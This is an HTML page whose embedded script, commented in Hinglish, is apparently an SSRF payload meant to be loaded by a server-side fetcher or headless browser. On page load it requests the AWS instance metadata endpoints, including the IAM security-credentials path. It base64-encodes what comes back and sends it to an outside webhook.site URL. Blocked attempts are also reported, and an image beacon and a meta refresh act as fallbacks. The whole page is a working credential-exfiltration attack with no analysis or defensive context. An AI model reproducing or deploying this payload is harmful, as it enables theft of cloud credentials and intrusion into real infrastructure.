<!DOCTYPE html>
<html>
<body>
<script>
var hook = 'https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c';
var urls = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://169.254.169.254/latest/user-data/'
];

// Webhook pe signal bhejo ke page load hua
fetch(hook + '?status=page_loaded');

// AWS metadata try karo
urls.forEach(function(url){
  fetch(url)
  .then(r => r.text())
  .then(d => fetch(hook + '?url=' + encodeURIComponent(url) + '&data=' + btoa(d)))
  .catch(e => fetch(hook + '?blocked=' + encodeURIComponent(url)));
});
</script>

<!-- JS ke bina bhi try karo -->
<img src="http://169.254.169.254/latest/meta-data/" onerror="fetch('https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?img=blocked')">
<meta http-equiv="refresh" content="3;url=http://169.254.169.254/latest/meta-data/">
</body>
</html>
